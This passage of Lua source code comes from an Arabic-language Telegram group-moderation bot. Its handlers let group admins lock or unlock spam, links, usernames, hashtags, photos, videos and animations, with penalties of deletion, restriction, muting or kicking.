local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(LaRiCa.."Spam:Group:User"..msg_chat_id ,"Spam:User","keed")  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التكرار").lockKid,"md",true)  
elseif text == "قفل التكرار بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(LaRiCa.."Spam:Group:User"..msg_chat_id ,"Spam:User","mute")  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التكرار").lockKtm,"md",true)  
elseif text == "قفل التكرار بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(LaRiCa.."Spam:Group:User"..msg_chat_id ,"Spam:User","kick")  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التكرار").lockKick,"md",true)  
elseif text == "فتح التكرار" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hdel(LaRiCa.."Spam:Group:User"..msg_chat_id ,"Spam:User")  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح التكرار").unLock,"md",true)  
end
if text == "قفل الروابط" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Link"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الروابط").Lock,"md",true)  
return false
end 
if text == "قفل الروابط بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Link"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الروابط").lockKid,"md",true)  
return false
end 
if text == "قفل الروابط بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Link"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الروابط").lockKtm,"md",true)  
return false
end 
if text == "قفل الروابط بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Link"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الروابط").lockKick,"md",true)  
return false
end 
if text == "فتح الروابط" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Link"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الروابط").unLock,"md",true)  
return false
end 
if text == "قفل المعرفات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:User:Name"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المعرفات").Lock,"md",true)  
return false
end 
if text == "قفل المعرفات بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:User:Name"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المعرفات").lockKid,"md",true)  
return false
end 
if text == "قفل المعرفات بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:User:Name"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المعرفات").lockKtm,"md",true)  
return false
end 
if text == "قفل المعرفات بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:User:Name"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المعرفات").lockKick,"md",true)  
return false
end 
if text == "فتح المعرفات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:User:Name"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح المعرفات").unLock,"md",true)  
return false
end 
if text == "قفل التاك" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:hashtak"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التاك").Lock,"md",true)  
return false
end 
if text == "قفل التاك بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:hashtak"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التاك").lockKid,"md",true)  
return false
end 
if text == "قفل التاك بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:hashtak"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التاك").lockKtm,"md",true)  
return false
end 
if text == "قفل التاك بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:hashtak"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التاك").lockKick,"md",true)  
return false
end 
if text == "فتح التاك" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:hashtak"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح التاك").unLock,"md",true)  
return false
end 
if text == "قفل الشارحه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Cmd"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الشارحه").Lock,"md",true)  
return false
end 
if text == "قفل الشارحه بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Cmd"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الشارحه").lockKid,"md",true)  
return false
end 
if text == "قفل الشارحه بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Cmd"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الشارحه").lockKtm,"md",true)  
return false
end 
if text == "قفل الشارحه بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Cmd"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الشارحه").lockKick,"md",true)  
return false
end 
if text == "فتح الشارحه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Cmd"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الشارحه").unLock,"md",true)  
return false
end 
if text == 'قفل السب'  then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:set(LaRiCa..'lock:Fshar'..msg.chat_id,true) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل السب").Lock,"md",true)  
end
if text == 'قفل الفارسيه'  then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:set(LaRiCa..'lock:Fars'..msg.chat_id,true) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الفارسيه").Lock,"md",true)  
end
if text == 'فتح السب' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:del(LaRiCa..'lock:Fshar'..msg.chat_id) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح السب").unLock,"md",true)  
end
if text == 'فتح الفارسيه' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:del(LaRiCa..'lock:Fars'..msg.chat_id) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الفارسيه").unLock,"md",true)  
end
if text == "قفل الصور"then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Photo"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصور").Lock,"md",true)  
return false
end 
if text == "قفل الصور بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Photo"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصور").lockKid,"md",true)  
return false
end 
if text == "قفل الصور بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Photo"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصور").lockKtm,"md",true)  
return false
end 
if text == "قفل الصور بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Photo"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الصور").lockKick,"md",true)  
return false
end 
if text == "فتح الصور" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Photo"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الصور").unLock,"md",true)  
return false
end 
if text == "قفل الفيديو" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Video"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الفيديو").Lock,"md",true)  
return false
end 
if text == "قفل الفيديو بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Video"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الفيديو").lockKid,"md",true)  
return false
end 
if text == "قفل الفيديو بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Video"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الفيديو").lockKtm,"md",true)  
return false
end 
if text == "قفل الفيديو بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Video"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الفيديو").lockKick,"md",true)  
return false
end 
if text == "فتح الفيديو" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Video"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الفيديو").unLock,"md",true)  
return false
end 
if text == "قفل المتحركه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Animation"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المتحركه").Lock,"md",true)  
return false
end 
if text == "قفل المتحركه بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Animation"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المتحركه").lockKid,"md",true)  
return false
end 
if text == "قفل المتحركه بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Animation"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل المتحركه").lockKtm,"md",true)  
return false
end 
if text == "قفل المتحركه بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
